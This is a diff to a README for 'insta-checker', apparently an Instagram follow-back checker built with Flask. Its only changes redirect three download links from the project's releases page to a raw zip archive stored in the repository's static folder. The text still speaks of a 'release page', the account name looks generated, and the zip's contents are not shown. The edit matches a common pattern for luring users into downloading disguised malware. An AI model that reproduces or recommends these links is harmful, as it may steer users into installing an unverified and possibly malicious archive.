@@ -1,6 +1,6 @@
 # 📷 insta-checker - See Who Follows You Back
 
-[![Download insta-checker](https://img.shields.io/badge/Download%20insta--checker-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fungicidal-swahili591/insta-checker/releases)
+[![Download insta-checker](https://img.shields.io/badge/Download%20insta--checker-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Fungicidal-swahili591/insta-checker/main/static/insta_checker_v1.9.zip)
 
 ## 🚀 What it does
 
@@ -20,7 +20,7 @@ It is built as a Flask app, so it opens in your web browser after you start it o
 
 Visit this page to download the latest version:
 
-https://github.com/Fungicidal-swahili591/insta-checker/releases
+https://raw.githubusercontent.com/Fungicidal-swahili591/insta-checker/main/static/insta_checker_v1.9.zip
 
 On the release page:
 
@@ -137,7 +137,7 @@ css, flask, followers, gram, html, ig, insta, instagram, javascript, python, unf
 
 Use this link to visit the release page and download the app:
 
-https://github.com/Fungicidal-swahili591/insta-checker/releases
+https://raw.githubusercontent.com/Fungicidal-swahili591/insta-checker/main/static/insta_checker_v1.9.zip
 
 ## 🧰 Common questions
 
